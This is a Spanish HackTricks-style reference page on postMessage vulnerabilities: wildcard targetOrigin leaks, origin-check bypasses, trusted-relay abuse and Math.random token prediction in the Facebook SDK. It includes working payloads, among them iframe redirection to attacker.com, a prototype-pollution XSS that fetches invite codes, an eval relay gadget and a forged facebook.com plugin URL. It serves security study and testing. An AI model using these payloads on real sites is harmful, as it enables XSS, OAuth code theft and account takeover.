# PostMessage Vulnerabilidades

{{#include ../../banners/hacktricks-training.md}}

## Enviar **PostMessage**

**PostMessage** usa la siguiente función para enviar un mensaje:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Ten en cuenta que **targetOrigin** puede ser un '\*' o una URL como _https://company.com._\
En el **segundo escenario**, el **mensaje solo puede enviarse a ese dominio** (incluso si el origin del Window object es diferente).\
Si se usa el **wildcard**, **los mensajes podrían enviarse a cualquier dominio**, y serán enviados al origin del Window object.

### Atacando iframe & wildcard en **targetOrigin**

Como se explica en [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) si encuentras una página que pueda ser **iframed** (sin `X-Frame-Header` protection) y que esté **enviando mensajes sensibles** vía **postMessage** usando un **wildcard** (\*), puedes **modificar** el **origin** del **iframe** y **leak** el **mensaje sensible** a un dominio controlado por ti.\
Ten en cuenta que si la página puede ser iframed pero el **targetOrigin** está **configurado a una URL y no a un wildcard**, este **truco no funcionará**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** es la función usada por JS para declarar la función que está **esperando `postMessages`**.\
Se usará un código similar al siguiente:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Nota en este caso cómo lo primero que hace el código es comprobar el **origin**. Esto es terriblemente **importante**, sobre todo si la página va a hacer **algo sensible** con la información recibida (como cambiar una contraseña). **Si no comprueba el origin, los atacantes pueden hacer que las víctimas envíen datos arbitrarios a estos endpoints** y cambiar las contraseñas de las víctimas (en este ejemplo).

### Enumeration

Para **encontrar event listeners** en la página actual puedes:

- **Buscar** en el código JS `window.addEventListener` y `$(window).on` (_versión JQuery_)
- **Ejecutar** en la consola de developer tools: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Ir a** _Elements --> Event Listeners_ en las developer tools del navegador

![](<../../images/image (396).png>)

- Usar una **extensión del navegador** como [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) o [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Estas extensiones **interceptarán todos los mensajes** y te los mostrarán.

### Origin check bypasses

- El atributo **`event.isTrusted`** se considera seguro ya que devuelve `True` solo para eventos generados por acciones genuinas del usuario. Aunque es difícil de eludir si se implementa correctamente, su importancia en las comprobaciones de seguridad es notable.
- El uso de **`indexOf()`** para la validación de origin en eventos PostMessage puede ser susceptible de bypass. Un ejemplo que ilustra esta vulnerabilidad es:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- El método **`search()`** de `String.prototype.search()` está pensado para expresiones regulares, no para strings. Pasar algo que no sea un regexp provoca la conversión implícita a regex, haciendo el método potencialmente inseguro. Esto se debe a que en regex un punto (.) actúa como comodín, permitiendo eludir la validación con dominios especialmente construidos. Por ejemplo:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- La función **`match()`**, similar a `search()`, procesa regex. Si el regex está mal construido, podría ser vulnerable a bypass.
- La función **`escapeHtml`** pretende sanitizar entradas escapando caracteres. Sin embargo, no crea un nuevo objeto escapado sino que sobrescribe las propiedades del objeto existente. Este comportamiento puede explotarse. En particular, si un objeto puede manipularse de forma que su propiedad controlada no reconozca `hasOwnProperty`, `escapeHtml` no funcionará como se espera. Esto se demuestra en los ejemplos siguientes:

- Fallo esperado:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypass al escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

En el contexto de esta vulnerabilidad, el objeto `File` es notablemente explotable debido a su propiedad `name` de solo lectura. Esta propiedad, cuando se usa en templates, no es sanitizada por la función `escapeHtml`, lo que conduce a riesgos de seguridad potenciales.

- La propiedad `document.domain` en JavaScript puede ser establecida por un script para acortar el dominio, permitiendo una aplicación más relajada de la same-origin policy dentro del mismo dominio padre.

### Origin-only trust + trusted relays

Si un receptor solo comprueba **`event.origin`** (p. ej., confía en cualquier `*.trusted.com`) a menudo puedes encontrar una página **"relay"** en ese origin que refleja parámetros controlados por el atacante vía `postMessage` hacia un `targetOrigin`/`targetWindow` suministrado. Ejemplos incluyen gadgets de marketing/analytics que toman query params y reenvían `{msg_type, access_token, ...}` a `opener`/`parent`. Puedes:

- **Abrir la página víctima en un popup/iframe que tenga un `opener`** para que sus handlers se registren (muchos pixels/SDKs solo adjuntan listeners cuando `window.opener` existe).
- **Navegar otra ventana del atacante al endpoint relay en el origin confiable**, rellenando los campos del mensaje que quieres inyectar (message type, tokens, nonces).
- Debido a que el mensaje ahora proviene **del origin confiable**, la validación basada solo en origin pasa y puedes desencadenar comportamientos privilegiados (cambios de estado, llamadas a APIs, escrituras en el DOM) en el listener de la víctima.

Patrones de abuso vistos en la naturaleza:

- SDKs de analytics (p. ej., estilo pixel/fbevents) consumen mensajes como `FACEBOOK_IWL_BOOTSTRAP`, luego **llaman a APIs backend usando un token suministrado en el mensaje** e incluyen **`location.href` / `document.referrer`** en el cuerpo de la petición. Si suministras tu propio token, puedes **leer estas peticiones en el historial/logs de peticiones del token** y exfiltrar **códigos/tokens OAuth** presentes en la URL/referrer de la página víctima.
- Cualquier relay que refleje campos arbitrarios en `postMessage` te permite **spoofear tipos de mensaje** esperados por listeners privilegiados. Combina esto con validación de entrada débil para alcanzar llamadas Graph/REST, desbloqueos de características, o flujos equivalentes a CSRF.

Consejos de búsqueda: enumera listeners de `postMessage` que solo comprueban `event.origin`, luego busca **endpoints HTML/JS del mismo origin que reenvían params URL vía `postMessage`** (previews de marketing, popups de login, páginas de error OAuth). Combina ambos con `window.open()` + `postMessage` para bypassear las comprobaciones de origin.

### e.origin == window.origin bypass

Al embeber una página web dentro de un **iframe sandboxed** usando %%%%%%, es crucial entender que el origin del iframe será establecido a null. Esto es especialmente importante cuando se trata de atributos sandbox y sus implicaciones en seguridad y funcionalidad.

Al especificar **`allow-popups`** en el atributo sandbox, cualquier ventana popup abierta desde el iframe hereda las restricciones sandbox de su padre. Esto significa que, a menos que también se incluya el atributo **`allow-popups-to-escape-sandbox`**, el origin de la ventana popup se establecerá de forma similar a `null`, alineándose con el origin del iframe.

En consecuencia, cuando se abre un popup en estas condiciones y se envía un mensaje desde el iframe al popup usando **`postMessage`**, ambos extremos, emisor y receptor, tienen sus origins establecidos en `null`. Esta situación conduce a que **`e.origin == window.origin`** evalúe como verdadero (`null == null`), porque tanto el iframe como el popup comparten el mismo valor de origin `null`.

Para más información **leer**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Es posible comprobar si el mensaje vino de la misma ventana en la que el script está escuchando (especialmente interesante para **Content Scripts from browser extensions** para verificar si el mensaje fue enviado desde la misma página):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Puedes forzar **`e.source`** de un mensaje a null creando un **iframe** que **envía** el **postMessage** y **se elimina inmediatamente**.

Para más información **lee:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Para llevar a cabo estos ataques, idealmente podrás **poner la página web víctima** dentro de un `iframe`. Pero algunas cabeceras como `X-Frame-Header` pueden **impedir** ese **comportamiento**.\
En esos escenarios aún puedes usar un ataque menos sigiloso. Puedes abrir una nueva pestaña hacia la aplicación web vulnerable y comunicarte con ella:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Robar mensaje enviado al iframe hijo bloqueando la página principal

En la siguiente página puedes ver cómo podrías robar unos **datos sensibles de postmessage** enviados a un **iframe hijo** bloqueando la **página principal** antes de enviar los datos y abusando de una **XSS en el iframe hijo** para **leak the data** antes de que sean recibidos:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Robar mensaje modificando la ubicación del iframe

Si puedes embeber una página web en un iframe sin X-Frame-Header que contenga otro iframe, puedes **cambiar la ubicación de ese iframe hijo**, así que si está recibiendo un **postmessage** enviado usando un **wildcard**, un atacante podría **cambiar** el **origin** de ese iframe a una página **controlada** por él y **robar** el mensaje:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage para Prototype Pollution y/o XSS

En escenarios donde los datos enviados a través de `postMessage` son ejecutados por JS, puedes embeber la **página** en un iframe y **explotar** el **prototype pollution/XSS** enviando el exploit vía `postMessage`.

Un par de **XSS muy bien explicadas mediante `postMessage`** pueden encontrarse en [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Ejemplo de un exploit para abusar de **Prototype Pollution y luego XSS** mediante un `postMessage` a un `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Para **más información**:

- Enlace a la página sobre [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Enlace a la página sobre [**XSS**](../xss-cross-site-scripting/index.html)
- Enlace a la página sobre [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### La allowlist de orígenes confiables no es una barrera

Una comprobación estricta de `event.origin` solo funciona si el origen de confianza no puede ejecutar attacker JS. Cuando páginas privilegiadas incrustan iframes de terceros y asumen que `event.origin === "https://partner.com"` es seguro, cualquier XSS en `partner.com` se convierte en un puente hacia el padre:
```javascript
// Parent (trusted page)
window.addEventListener("message", (e) => {
if (e.origin !== "https://partner.com") return
const [type, html] = e.data.split("|")
if (type === "Partner.learnMore") target.innerHTML = html // DOM XSS
})
```
Patrón de ataque observado en entornos reales:

1. **Exploit XSS in the partner iframe** y dejar un relay gadget para que cualquier `postMessage` se convierta en code exec dentro del origen de confianza:
```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```
2. **Desde la attacker page**, envía JS al compromised iframe que reenvía un allowed message type de vuelta al parent. El mensaje se origina en `partner.com`, pasa la allowlist y contiene HTML que se inserta de forma insegura:
```javascript
postMessage({
cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```
3. El parent inyecta el attacker HTML, dando **JS execution in the parent origin** (p.ej., `facebook.com`), que luego puede usarse para robar OAuth codes o pivotar a full account takeover flows.

Key takeaways:

- **Partner origin isn't a boundary**: cualquier XSS en un socio "trusted" permite a los atacantes enviar mensajes permitidos que evaden las comprobaciones de `event.origin`.
- Handlers que **render partner-controlled payloads** (p.ej., `innerHTML` en tipos de mensaje específicos) convierten la compromisión del partner en un DOM XSS de same-origin.
- Una amplia **message surface** (muchos tipos, sin validación de estructura) ofrece más gadgets para pivotar una vez que un iframe del partner está comprometido.

### Predicting **`Math.random()`** callback tokens in postMessage bridges

Cuando la validación de mensajes usa un “shared secret” generado con `Math.random()` (p.ej., `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) y el mismo helper también nombra plugin iframes, puedes recuperar PRNG outputs y falsificar mensajes trusted:

- **Leak PRNG outputs via `window.name`:** El SDK auto-nombra plugin iframes con `guid()`. Si controlas el top frame, iframea la página víctima, luego navega el plugin iframe a tu origin (p.ej., `window.frames[0].frames[0].location='https://attacker.com'`) y lee `window.frames[0].frames[0].name` para obtener un raw `Math.random()` output.
- **Force more outputs without reloads:** Algunas SDKs exponen un reinit path; en el FB SDK, disparar `init:post` con `{xfbml:1}` fuerza `XFBML.parse()`, destruye/crea de nuevo el plugin iframe y genera nuevos names/callback IDs. Reinit repetido produce tantos PRNG outputs como sea necesario (tener en cuenta llamadas internas extra a `Math.random()` para callback/iframe IDs, por lo que los solvers deben saltar valores intermedios).
- **Trusted-origin delivery via parameter pollution:** Si un endpoint first-party del plugin refleja un parámetro no saneado dentro del payload cross-window (p.ej., `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), puedes inyectar `&type=...&iconSVG=...` preservando el trusted `facebook.com` origin.
- **Predict the next callback:** Convierte los iframe names filtrados de nuevo a floats en `[0,1)` y alimenta varios valores (incluso no consecutivos) a un predictor de `Math.random` de V8 (p.ej., basado en Z3). Genera el siguiente `guid()` localmente para falsificar el token de callback esperado.
- **Trigger the sink:** Construye los datos de postMessage para que el bridge dispare `xd.mpn.setupIconIframe` e inyecte HTML en `iconSVG` (p.ej., URL-encoded `<img src=x onerror=...>`), logrando DOM XSS dentro del hosting origin; desde allí, same-origin iframes (OAuth dialogs, arbiters, etc.) pueden leerse.
- **Framing quirks help:** La cadena requiere framing. En algunos webviews móviles, `X-Frame-Options` puede degradarse a un `ALLOW-FROM` no soportado cuando `frame-ancestors` está presente, y parámetros “compat” pueden forzar `frame-ancestors` permisivos, habilitando el `window.name` side channel.

#### Minimal forged message example
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referencias

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Para practicar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Self XSS Facebook Payments](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
